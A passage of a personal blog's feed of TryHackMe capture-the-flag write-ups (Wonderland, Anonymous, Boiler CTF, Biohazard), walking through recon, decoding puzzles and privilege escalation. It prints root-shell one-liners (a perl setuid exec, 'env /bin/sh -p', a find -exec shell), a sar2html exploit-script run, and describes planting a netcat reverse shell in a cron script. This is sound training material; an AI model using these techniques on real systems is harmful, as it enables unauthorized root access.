There, in <code>hatter</code>&rsquo;s home folder, their password exists in plaintext!
Thus, no need to keep using that shell, I can ssh into <code>hatter</code> far more
easily.
</p>
</div>
</div>
<div id="outline-container-orgf620093" class="outline-2">
<h2 id="orgf620093"><span class="section-number-2">4.</span> <a href="#orgf620093">Hatter</a></h2>
<div class="outline-text-2" id="text-4">
<p>
As <code>hatter</code> there is not much I can do. In fact, this is the part of the
room where I got impressively stuck and could not figure out what to
do, so one can say I cheated my way out :(
</p>

<p>
Since <code>hatter</code>:
</p>
<ul class="org-ul">
<li>can not run any commands with <code>sudo</code></li>
<li>does not have any cronjobs</li>
<li>does not have any potentially helpful suid files</li>
</ul>
<p>
running <code>linpeas.sh</code>, as payloads all the things suggests, was the
logical choice. The problem was that, due to the sheer size of its
output (and its strange encoding that would not let for its output to
be redirected to a file) I could not read all of it (initially due to
the terminal application not scrolling back enough so information was
lost), let alone understand it.
</p>

<p>
I, then, carefully not to see more than needed, proceeded with reading:
<a href="https://fmash16.github.io/content/writeups/tryhackme/thm-Wonderland.html">https://fmash16.github.io/content/writeups/tryhackme/thm-Wonderland.html</a>
</p>
<ol class="org-ol">
<li>The <code>/etc/hosts</code> idea was incredible, it can really help at times.</li>
<li>Got me thinking whether using a reverse shell for <code>rabbit</code> was the
only logical option. The author there used a solution perhaps
identical to mine, but could not <code>bash -i</code> work as well?</li>
<li><b>SUID Capability</b></li>
</ol>

<p>
Now, this last one (along with the python hijack trick, which took me
some time to find out) made the whole room surely more than just worth
it!
</p>
</div>
</div>
<div id="outline-container-org1213a66" class="outline-2">
<h2 id="org1213a66"><span class="section-number-2">5.</span> <a href="#org1213a66">Privilege Escalation through <code>suid</code> capability</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Hidden in <code>linpeas.sh</code> output, there is the fact that in the target
machine <code>perl</code> has the capability to <code>setuid</code>. This effectively means that
we can <code>setuid(0)</code> and run the perl commands as root.
</p>

<p>
GTFOBins, like always, is a good place to go once you know there is
something like that you can take advantage of, and it does not
disappoint. 
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org2f7ae7f">/usr/bin/perl -e <span class="org-string">'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span>
</pre>
</div>

<p>
After that I just used <code>find</code>, to get both <code>root.txt</code> and <code>user.txt</code>
</p>
</div>
</div>
<div id="outline-container-org86c3f62" class="outline-2">
<h2 id="org86c3f62"><span class="section-number-2">6.</span> <a href="#org86c3f62">Summing up</a></h2>
<div class="outline-text-2" id="text-6">
<p>
I really liked how this room challenged me. It was not just at the
last part, the python path hijack was a really nice technique as well!
While, I felt that I was going smoothly, having developed a basic
methodology/way of thinking that has so far worked for me, it became
apparent that my Linux PrivEsc skills could be significantly improved.
On we go!
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>THM: Anonymous</title>
<link>posts/20231107_thm_anonymous.html</link>
<pubDate>Tue, 07 Nov 2023 09:50:00 +0200</pubDate>
<guid>posts/20231107_thm_anonymous.html</guid>
<description>
<![CDATA[<div id="outline-container-org87ce4d8" class="outline-2">
<h2 id="org87ce4d8"><span class="section-number-2">1.</span> <a href="#org87ce4d8">Recon</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>adding to <code>/etc/hosts</code></li>
</ul>


<p>
We start by doing a quick scan on the target machine:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgf7aee7c">nmap -sV -sC -oN nmap.initial anonymous.thm
</pre>
</div>

<p>
There are some interesting findings:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Port 21: FTP: allowing for anonymous login</li>
<li class="off"><code>[&#xa0;]</code> Port 22: SSH: probably going to utilize that later</li>
<li class="off"><code>[&#xa0;]</code> Ports 139/445: Samba file server</li>
</ul>

<p>
Before going further with the file servers, starting a complete scan
to make sure no port gets &rsquo;lost&rsquo;
</p>
<div class="org-src-container">
<pre class="src src-bash"><span class="org-variable-name">IP</span>=anonymous.thm
nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
</pre>
</div>
</div>
<div id="outline-container-org0114389" class="outline-3">
<h3 id="org0114389"><span class="section-number-3">1.1.</span> <a href="#org0114389">FTP Server</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
Visiting the ftp server (and in <code>nmap</code>&rsquo;s output), we see that there is a
directory <code>scripts</code>, whose contents may be useful to us:
</p>
<ul class="org-ul">
<li><code>ftp anonymous.thm</code></li>
<li>logging in as <code>anonymous</code>, successfully</li>
<li>getting the files back to our local machine with <code>get</code></li>
</ul>

<p>
These files are:
</p>
<ul class="org-ul">
<li><code>clean.sh</code>, a simple (and at the same time actually non-working)
shell script</li>
<li>A log file, for clean.sh</li>
<li>A <code>todo.txt</code>, which simply states that &ldquo;<i>anonymous login is not safe</i>&rdquo;</li>
</ul>

<p>
Since I&rsquo;m writing this article while completing the room, I did not
have to wait much before getting the log file again and comparing it
with the older version:
</p>
<pre class="example" id="org60daecf">
root@ip-10-10-121-199:~# cat removed_files.log | wc -l
28
# Here I went back to the ftp server got the file again
root@ip-10-10-121-199:~# cat removed_files.log | wc -l
33
</pre>

<p>
It is obvious, then, that <code>clean.sh</code>, that populates the log file,
must be connected to a cronjob. This should be an easy point of entry
for us!
</p>

<p>
Just by adding a simple netcat reverse shell in <code>clean.sh</code>, gives as
access to the machine!
</p>
</div>
</div>
</div>
<div id="outline-container-orga1cb626" class="outline-2">
<h2 id="orga1cb626"><span class="section-number-2">2.</span> <a href="#orga1cb626">Privilege escalation</a></h2>
<div class="outline-text-2" id="text-2">
<p>
After making our terminal a little more usable with <code>python</code>&rsquo;s pty module, we see that we are logged in as <code>namelessone</code>, who is part of
many groups, however, since we do not know the user&rsquo;s password <code>sudo -l</code>
is unusable.
</p>
<pre class="example" id="org269b994">
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
</pre>


<p>
Searching for files with <code>SUID</code>, we <code>find</code> (pun intended), that <code>env</code> is
improperly configured, allowing for an easy privilege escalation:
</p>
<pre class="example" id="org3b644e3">
namelessone@anonymous:~$ env /bin/sh -p
env /bin/sh -p
# whoami
whoami
root
</pre>
</div>
</div>
<div id="outline-container-org9b2330b" class="outline-2">
<h2 id="org9b2330b"><span class="section-number-2">3.</span> <a href="#org9b2330b">Conclusion</a></h2>
<div class="outline-text-2" id="text-3">
<p>
I do not know why this room was marked as being one of medium
difficulty, but I liked being able to complete it really easily and
quickly :P.
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>THM: Boiler CTF</title>
<link>posts/20231111_thm_boiler_ctf.html</link>
<pubDate>Sat, 11 Nov 2023 19:21:00 +0200</pubDate>
<guid>posts/20231111_thm_boiler_ctf.html</guid>
<description>
<![CDATA[<div id="outline-container-orge9dba48" class="outline-2">
<h2 id="orge9dba48"><span class="section-number-2">1.</span> <a href="#orge9dba48">Intro</a></h2>
<div class="outline-text-2" id="text-1">
<p>
After giving <code>attacktive directory</code> a try, and barely surviving, I went
back to completing walkthrough rooms, striving to complete the Junior
Pentester path before Christmass. This was my &#x2026; break from these rooms. 
</p>

<p>
Making it a habit to edit <code>etc/hosts</code> before starting any CTF, to ensure
that I won&rsquo;t keep going back and forth to remember the machine&rsquo;s IP
has been really helpful!
</p>
</div>
</div>
<div id="outline-container-orgbfa7e67" class="outline-2">
<h2 id="orgbfa7e67"><span class="section-number-2">2.</span> <a href="#orgbfa7e67">Recon</a></h2>
<div class="outline-text-2" id="text-2">
<p>
The ordinary initial nmap scan gives us some basic starting info:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org24d5583"><span class="org-variable-name">IP</span>=boiler.thm
nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
</pre>
</div>

<p>
There are 3 open (tcp) ports, all of which are interesting:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> 21: ftp, allowing anonymous login</li>
<li class="off"><code>[&#xa0;]</code> 80: An apache web server</li>
<li class="off"><code>[&#xa0;]</code> 10000: A strange MiniServ 1.930 service, which I&rsquo;ll look into later</li>
</ul>

<p>
Before moving on, like always, I started a full scan as well, just to be safe:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org1274051">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
</pre>
</div>
</div>
<div id="outline-container-org7de4a4e" class="outline-3">
<h3 id="org7de4a4e"><span class="section-number-3">2.1.</span> <a href="#org7de4a4e">Enumerating the ftp server</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
After logging in the ftp server as <code>anonymous</code>, I only had to run <code>ls -a</code>,
(since plain <code>ls</code> did not list any files and <code>pwd</code> told me that I&rsquo;m in <code>/</code>),
to see a hidden file, which I then moved to my machine and checked
out:
</p>

<pre class="example" id="org6f7d94c">
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
</pre>

<p>
It is encrypted, but not in any formats I have gotten used to, but I
figured it would not be very difficult to find (it seemed like a 1to1
map). It was actually the first technique I tried: ROT13
</p>

<pre class="example" id="org04dcd2a">
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
</pre>

<p>
With that said, after also checking for exploits in the FTP server&rsquo;s
version, I do not think that there is anything else here.
</p>
</div>
</div>
<div id="outline-container-orgc0cb40f" class="outline-3">
<h3 id="orgc0cb40f"><span class="section-number-3">2.2.</span> <a href="#orgc0cb40f">Analyzing the web server</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
I am getting pretty comfortable checking webpages out, so I was
disappointed seeing just the default Apache2 Homepage.
</p>


<div id="orgff0661f" class="figure">
<p><img src="posts/images/20231111_193556_screenshot.png" alt="20231111_193556_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Sad</p>
</div>

<p>
However, seeing that there were disallowed entries in robots.txt
(<code>http-robots.txt</code> was executed among the default scripts by nmap), I figured
that I should check it out. There were <b>a lot of entries there<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup></b>,
but after visiting them, they were not of any interest (the
files/directories did not exist).
</p>

<p>
There was, a little bit encoded string following, that I had to check. 
</p>
<pre class="example" id="orgafe5a2d">
079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
</pre>
<p>
Seeing that everything consisted of 3 digits, all of which lower than
122, I thought that it may be a weird way to depict a string, using
its ascii characters:
</p>
<div class="org-src-container">
<pre class="src src-python" id="org0fab834"><span class="org-keyword">def</span> <span class="org-function-name">convert_to_ascii</span>(input_string):
    <span class="org-variable-name">integers</span> <span class="org-operator">=</span> input_string.split()
    <span class="org-variable-name">ascii_chars</span> <span class="org-operator">=</span> [<span class="org-builtin">chr</span>(<span class="org-builtin">int</span>(num)) <span class="org-keyword">for</span> num <span class="org-keyword">in</span> integers]
    <span class="org-keyword">return</span> <span class="org-string">''</span>.join(ascii_chars)

<span class="org-variable-name">input_string</span> <span class="org-operator">=</span> <span class="org-builtin">input</span>(<span class="org-string">"Enter space-separated integers: "</span>)
<span class="org-variable-name">result</span> <span class="org-operator">=</span> convert_to_ascii(input_string)
<span class="org-builtin">print</span>(<span class="org-string">"ASCII representation:"</span>, result)
</pre>
</div>

<p>
The output was just barely more promising than what we started with,
and hash-id does not give me reason to believe its a hash (of any kind)
</p>
<pre class="example" id="orgbc0b042">
OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
</pre>

<p>
(It was actually not used at all)
</p>

<p>
I, then, ran
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org0a2af16">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://boiler.thm -o gobuster.big
</pre>
</div>
<p>
giving me a couple of <i>new</i> directories <b>AND</b>, which is more an actual website!
</p>


<div id="org162cd65" class="figure">
<p><img src="posts/images/20231111_195519_screenshot.png" alt="20231111_195519_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Now we talkin&rsquo;</p>
</div>


<p>
in the meantime, the full nmap scan was complete, and after using <code>nc</code>
to connect to that port (55007), an ssh server also became available :P.
</p>
</div>
</div>
<div id="outline-container-org4dba5e9" class="outline-3">
<h3 id="org4dba5e9"><span class="section-number-3">2.3.</span> <a href="#org4dba5e9">Webmin</a></h3>
<div class="outline-text-3" id="text-2-3">
<p>
The question &ldquo;Can you exploit the service running on that port?&rdquo; got
me thinking that I should most probably go there, before keep going
against the joomla website, but I was wrong. A quick search revealed
that there was no readily available exploit on the running version, so
the answer there, sadly, was &ldquo;nay&rdquo;
</p>
</div>
</div>
<div id="outline-container-org0972660" class="outline-3">
<h3 id="org0972660"><span class="section-number-3">2.4.</span> <a href="#org0972660">Joomla Website</a></h3>
<div class="outline-text-3" id="text-2-4">
<p>
Getting back to the website, I ran another gobuster instance, this
time aimed at enumerating the <code>joomla</code> subdir:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgcdefbfa">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://boiler.thm/joomla -o gobuster-joomla.big
</pre>
</div>

<p>
There were <b>a lot</b> of entries as well:
</p>
<ul class="org-ul">
<li>The ones starting with <code>_</code> got my attention, and after getting to
<code>_test</code>, I thought I am getting somewhere</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org7cf78a1" class="outline-2">
<h2 id="org7cf78a1"><span class="section-number-2">3.</span> <a href="#org7cf78a1">Exploiting sar2html</a></h2>
<div class="outline-text-2" id="text-3">
<p>
The path I found in the previous step seemed too good to be true, and
after searching here and there a little bit I got accross this github repo:
<a href="https://github.com/AssassinUKG/sar2HTML">https://github.com/AssassinUKG/sar2HTML</a>, containing a python script for
exploiting sar2html
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org01a1999">python3 sar2HTMLshell.py  -ip boiler.thm -pe /joomla/_test
</pre>
</div>

<p>
There, we had access as <code>www-data</code>, in a simple shell, also revealing a
user and password, for us to use in the ssh server.
</p>
<pre class="example" id="org209f86f">
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: REDACTED
</pre>

<p>
Before logging in as <code>basterd</code>, I thought it best to get a little bit
more info on the machine, so I reran the command, this time to get a
reverse shell, which I then enhanced with python.
</p>
</div>
<div id="outline-container-org7f8c959" class="outline-3">
<h3 id="org7f8c959"><span class="section-number-3">3.1.</span> <a href="#org7f8c959">Users</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
There are 3 actual users:
</p>
<ul class="org-ul">
<li>root</li>
<li>stoner</li>
<li>basterd (which troubles me, since there is no login shell in their
<code>/etc/password</code> entry)</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-orge35ab78" class="outline-2">
<h2 id="orge35ab78"><span class="section-number-2">4.</span> <a href="#orge35ab78">Basterd</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Yeah, I did not enumerate much I suppose, but seeing that it was a
limited user, I thought there was no point in losing more time there.
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org87db42c">ssh basterd@boiler.thm -p55007
</pre>
</div>

<p>
Basterd was equally restricted as a user, but a <code>backup.sh</code> file in
their home folder (which I checked initially hoping that it would be a
cronjob running from a user <code>backup</code> that I had seen in <code>/etc/passwd</code>
before), contained <code>stoner</code>&rsquo;s password. Not bad
</p>

<pre class="example" id="orgf46e6cb">
USER=stoner
#REDACTED
</pre>
</div>
</div>
<div id="outline-container-org6bcdf83" class="outline-2">
<h2 id="org6bcdf83"><span class="section-number-2">5.</span> <a href="#org6bcdf83">Stoner</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Now, this seems to be something we can work with :P.
</p>

<p>
user.txt exists hidden in our home folder, and&#x2026;
</p>
<pre class="example" id="org257917c">
stoner@Vulnerable:/home$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
</pre>
<p>
The room&rsquo;s creator is playing with us.
</p>

<p>
Lucky me, the same command I ran to get some more info on the system
seems to be my way out:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgf0a1458">find / -perm /4000 2&gt;/dev/null
</pre>
</div>
<p>
revealed that I can execute it as root, so:
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org056a119">find . -exec /bin/sh -p <span class="org-string">\;</span> -quit
</pre>
</div>
</div>
</div>
<div id="outline-container-orge62d6f2" class="outline-2">
<h2 id="orge62d6f2"><span class="section-number-2">6.</span> <a href="#orge62d6f2">Root</a></h2>
<div class="outline-text-2" id="text-6">
<p>
The flag can be found in <code>/root</code>
</p>
</div>
</div>
<div id="outline-container-orgc54f829" class="outline-2">
<h2 id="orgc54f829"><span class="section-number-2">7.</span> <a href="#orgc54f829">Conclusion</a></h2>
<div class="outline-text-2" id="text-7">
<p>
This room was really nice. I agree with the author, it was not that
difficult, it just took some time to follow the threads. That&rsquo;s it for today.
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
I do not know why only one entry was logged in the script&rsquo;s
output, though. 
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>THM: Biohazard</title>
<link>posts/20231120_thm_biohazard.html</link>
<pubDate>Mon, 20 Nov 2023 15:38:00 +0200</pubDate>
<guid>posts/20231120_thm_biohazard.html</guid>
<description>
<![CDATA[<div id="outline-container-org2b08124" class="outline-2">
<h2 id="org2b08124"><span class="section-number-2">1.</span> <a href="#org2b08124">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
This was an interesting room. It actually <i>simulated</i> an escape room in
the first part, collecting keys to use again in the future and
combining clues to pivot. I am not sure of the applications it may
have in the real world, since it heavily relied on tedious
encoding/decoding and only the steganography part was relatively
challenging (mainly because I did not have a clear gameplan for that I
suppose).
</p>

<p>
I liked it, though. It was fun
</p>
</div>
</div>
<div id="outline-container-orgf2da71f" class="outline-2">
<h2 id="orgf2da71f"><span class="section-number-2">2.</span> <a href="#orgf2da71f">Reconnaissance</a></h2>
<div class="outline-text-2" id="text-2">
<p>
First things first, edit <code>/etc/hosts</code>, to be able to use a more
memorable address for the target machine: I used <code>biohazard.thm</code>, as you
will see in the rest of the room.
</p>
</div>
<div id="outline-container-org36c277d" class="outline-3">
<h3 id="org36c277d"><span class="section-number-3">2.1.</span> <a href="#org36c277d">Port enumeration</a></h3>
<div class="outline-text-3" id="text-2-1">
<div class="org-src-container">
<pre class="src src-bash" id="org4d7af17"><span class="org-variable-name">IP</span>=biohazard.thm
nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
</pre>
</div>

<p>
Which gives us the following:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> ftp server</li>
<li class="off"><code>[&#xa0;]</code> ssh server</li>
<li class="off"><code>[&#xa0;]</code> http server</li>
</ul>

<p>
I, then started the good ol&rsquo; full scan to see whether I missed
anything and went on to the web server, hoping to find anything there.
</p>
</div>
</div>
</div>
<div id="outline-container-org2a75929" class="outline-2">
<h2 id="org2a75929"><span class="section-number-2">3.</span> <a href="#org2a75929">The Mansion (Web Analysis)</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Checking the web server, both manually and with our unique set of
tools. The first flag, actually exists right there in the homepage.
</p>
</div>
<div id="outline-container-org8840546" class="outline-3">
<h3 id="org8840546"><span class="section-number-3">3.1.</span> <a href="#org8840546">Mansion Main</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Simply moving in the website we get to <code>/mansionMain</code>, where a hint also
reveals <code>/diningRoom</code>
</p>
</div>
</div>
<div id="outline-container-org45da1be" class="outline-3">
<h3 id="org45da1be"><span class="section-number-3">3.2.</span> <a href="#org45da1be">Dining Room</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
There, we get an emblem (flag), and a hint:
</p>

<p>
Furthermore, a strange <i>input flag</i> box appears, but it appears like
nothing happens when we fill in the flag.
</p>


<div id="org4210754" class="figure">
<p><img src="posts/images/20231120_155133_screenshot.png" alt="20231120_155133_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Input flag box</p>
</div>
</div>
</div>
<div id="outline-container-org1dde3bf" class="outline-3">
<h3 id="org1dde3bf"><span class="section-number-3">3.3.</span> <a href="#org1dde3bf">Tea Room</a></h3>
<div class="outline-text-3" id="text-3-3">
<p>
Simply reveals the lock pick flag and directs us to the <code>/artRoom</code>
</p>
</div>
</div>
<div id="outline-container-org03738eb" class="outline-3">
<h3 id="org03738eb"><span class="section-number-3">3.4.</span> <a href="#org03738eb">Art Room</a></h3>
<div class="outline-text-3" id="text-3-4">
<p>
Gives us the <i>map</i> of the house:
</p>
<pre class="example" id="org423817b">
Location:
/diningRoom/
/teaRoom/
/artRoom/
/barRoom/
/diningRoom2F/
/tigerStatusRoom/
/galleryRoom/
/studyRoom/
/armorRoom/
/attic/
</pre>

<p>
After seeing that, I started checking each of those rooms I had not
checked before.
</p>
</div>
</div>
<div id="outline-container-orgb03cfe7" class="outline-3">
<h3 id="orgb03cfe7"><span class="section-number-3">3.5.</span> <a href="#orgb03cfe7">Bar Room</a></h3>
<div class="outline-text-3" id="text-3-5">
<p>
Using the lockpicking flag there, we reveal a hidden subroom
</p>
<pre class="example" id="orgbc83a61">
http://biohazard.thm/barRoom357162e3db904857963e6e0b64b96ba7/
</pre>

<p>
We get a music note - but the string is not something that actually
points me anywhere. I&rsquo;m thinking of a simple encoding function:
</p>
<pre class="example" id="orga3635be">
Look like a music note
NV2XG2LDL5ZWQZLFOR5TGNRSMQ3TEZDFMFTDMNLGGVRGIYZWGNSGCZLDMU3GCMLGGY3TMZL5 
</pre>

<p>
Maybe <code>moonlight somata</code> actually is a key! (Post-Completion: It was not.)
</p>

<p>
After trial and error it just happened that I discovered it was base32
(tested most of the available options manually :( )
</p>

<p>
At the gold emblem,using our older emblem flag:
</p>
<pre class="example" id="orgb9e8f6b">
rebecca
</pre>

<p>
After that I went back to <code>diningRoom</code> to use the gold emblem flag there
</p>
<pre class="example" id="orge9aa208">
klfvg ks r wimgnd biz mpuiui ulg fiemok tqod. Xii jvmc tbkg ks tempgf tyi_hvgct_jljinf_kvc
</pre>

<p>
Which is obviously a substitution algorithm, since it resembles an
actual sentence (Post-completion: Obviously&#x2026;):
</p>
<ul class="org-ul">
<li>crossed out ROTXX algorithms</li>
<li>crossed out pretty much every encoding algorithm</li>
</ul>

<p>
Started experimenting with everything on Cyberchef, and when stuck,
after seeing that rebecca was not a flag on thm, started using it as a
key! Interestingly, it was encrypted with the Vigenere Cipher
</p>
<pre class="example" id="org4612fd1">
there is a shield key inside the dining room. The html page is called the_great_shield_key
</pre>
</div>
</div>
<div id="outline-container-org4c6b625" class="outline-3">
<h3 id="org4c6b625"><span class="section-number-3">3.6.</span> <a href="#org4c6b625">Dining Room 2F</a></h3>
<div class="outline-text-3" id="text-3-6">
<p>
This time I was lucky enough with Rot13:
</p>
<pre class="example" id="orgd262576">
Lbh trg gur oyhr trz ol chfuvat gur fgnghf gb gur ybjre sybbe. Gur trz vf ba gur qvavatEbbz svefg sybbe. Ivfvg fnccuver.ugzy 
You get the blue gem by pushing the status to the lower floor. The gem is on the diningRoom first floor. Visit sth.html 
</pre>

<p>
After going there, the blue gem flag is revealed.
</p>
</div>
</div>
<div id="outline-container-orgb8c4676" class="outline-3">
<h3 id="orgb8c4676"><span class="section-number-3">3.7.</span> <a href="#orgb8c4676">Tiger Status Room</a></h3>
<div class="outline-text-3" id="text-3-7">
<p>
I was expecting this to give us something with the blue<sub>gem</sub> flag,
however nothing happened&#x2026; at least not the first time. I was so sure
that this was the right place to use the blue<sub>gem</sub> flag, so I checked
closer what I had just pasted there, and sure enough, there was a
space following, which ruined it for me. After removing it, everything
was working as expected, giving me:
</p>

<pre class="example" id="orga37149e">
crest 1:
S0pXRkVVS0pKQkxIVVdTWUpFM0VTUlk9
Hint 1: Crest 1 has been encoded twice
Hint 2: Crest 1 contanis 14 letters
Note: You need to collect all 4 crests, combine and decode to reavel another path
The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it
</pre>
</div>
</div>
<div id="outline-container-org806d876" class="outline-3">
<h3 id="org806d876"><span class="section-number-3">3.8.</span> <a href="#org806d876">Gallery Room</a></h3>
<div class="outline-text-3" id="text-3-8">
<p>
Strangely named <i>Gallerty</i>:
</p>
<pre class="example" id="org11d2d43">
crest 2:
GVFWK5KHK5WTGTCILE4DKY3DNN4GQQRTM5AVCTKE
Hint 1: Crest 2 has been encoded twice
Hint 2: Crest 2 contanis 18 letters
Note: You need to collect all 4 crests, combine and decode to reavel another path
The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it
</pre>
</div>
</div>
<div id="outline-container-org4d31f31" class="outline-3">
<h3 id="org4d31f31"><span class="section-number-3">3.9.</span> <a href="#org4d31f31">Study Room</a></h3>
<div class="outline-text-3" id="text-3-9">
<p>
The study room entrance seems to need a flag to unlock:
</p>
<ul class="org-ul">
<li>Helmet symbol on the door (?)</li>
</ul>

<blockquote>
<p>
I am not even sure I completed this. 
</p>
</blockquote>
</div>
</div>
<div id="outline-container-org00d1a7f" class="outline-3">
<h3 id="org00d1a7f"><span class="section-number-3">3.10.</span> <a href="#org00d1a7f">Armor room</a></h3>
<div class="outline-text-3" id="text-3-10">
<p>
The armor room entrance seems to need a flag to unlock:
</p>
<ul class="org-ul">
<li>Shield symbol on the door, so we use the shield flag</li>
</ul>

<pre class="example" id="org6913b40">
crest 3:
MDAxMTAxMTAgMDAxMTAwMTEgMDAxMDAwMDAgMDAxMTAwMTEgMDAxMTAwMTEgMDAxMDAwMDAgMDAxMTAxMDAgMDExMDAxMDAgMDAxMDAwMDAgMDAxMTAwMTEgMDAxMTAxMTAgMDAxMDAwMDAgMDAxMTAxMDAgMDAxMTEwMDEgMDAxMDAwMDAgMDAxMTAxMDAgMDAxMTEwMDAgMDAxMDAwMDAgMDAxMTAxMTAgMDExMDAwMTEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAxMTAgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAxMDEgMDAxMTAxMTAgMDAxMDAwMDAgMDAxMTAwMTEgMDAxMTEwMDEgMDAxMDAwMDAgMDAxMTAxMTAgMDExMDAwMDEgMDAxMDAwMDAgMDAxMTAxMDEgMDAxMTEwMDEgMDAxMDAwMDAgMDAxMTAxMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMTEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAwMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAxMDEgMDAxMTEwMDAgMDAxMDAwMDAgMDAxMTAwMTEgMDAxMTAwMTAgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTEwMDA=
Hint 1: Crest 3 has been encoded three times
Hint 2: Crest 3 contanis 19 letters
Note: You need to collect all 4 crests, combine and decode to reavel another path
The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it
</pre>
</div>
</div>
<div id="outline-container-org818e58b" class="outline-3">
<h3 id="org818e58b"><span class="section-number-3">3.11.</span> <a href="#org818e58b">Attic entrance</a></h3>
<div class="outline-text-3" id="text-3-11">
<p>
The attic room entrance seems to need a flag to unlock:
</p>
<ul class="org-ul">
<li>Shield symbol on the door makes us use the shield flag</li>
</ul>

<pre class="example" id="org6a0da9a">
crest 4:
gSUERauVpvKzRpyPpuYz66JDmRTbJubaoArM6CAQsnVwte6zF9J4GGYyun3k5qM9ma4s
Hint 1: Crest 2 has been encoded twice
Hint 2: Crest 2 contanis 17 characters
Note: You need to collect all 4 crests, combine and decode to reavel another path
The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it
</pre>
</div>
</div>
</div>
<div id="outline-container-org65863e8" class="outline-2">
<h2 id="org65863e8"><span class="section-number-2">4.</span> <a href="#org65863e8">The Crest</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Having collected all 4 crests, it was obviously time for me to start
experimenting with decoding them.
</p>
</div>
<div id="outline-container-orgac89a5e" class="outline-3">
<h3 id="orgac89a5e"><span class="section-number-3">4.1.</span> <a href="#orgac89a5e">Crest 1</a></h3>
<div class="outline-text-3" id="text-4-1">
<p>
I first tried base64, and the output seemed not-so-off, ending in =.
For the second encoding, I thought it could be base64 again, but the
output was off (17 chars in length). Then I tried, base32 and it
produced a string of length 14:
</p>
<pre class="example" id="orgf55186e">
RlRQIHVzZXI6IG
</pre>
</div>
</div>
<div id="outline-container-orgde6232f" class="outline-3">
<h3 id="orgde6232f"><span class="section-number-3">4.2.</span> <a href="#orgde6232f">Crest 2</a></h3>
<div class="outline-text-3" id="text-4-2">
<p>
Base32 (having it on my mind since the first time I encountered it in
this room), and then base58 (suggested by CyberChef&#x2026; if one just
uses the right tools :P)
</p>

<pre class="example" id="orgfc35a68">
h1bnRlciwgRlRQIHBh
</pre>
</div>
</div>
<div id="outline-container-org9cdad3b" class="outline-3">
<h3 id="org9cdad3b"><span class="section-number-3">4.3.</span> <a href="#org9cdad3b">Crest 3</a></h3>
<div class="outline-text-3" id="text-4-3">
<p>
Base64, binary and hex gives us:
</p>

<pre class="example" id="orgcfc52c2">
c3M6IHlvdV9jYW50X2h
</pre>
</div>
</div>
<div id="outline-container-org22c3c26" class="outline-3">
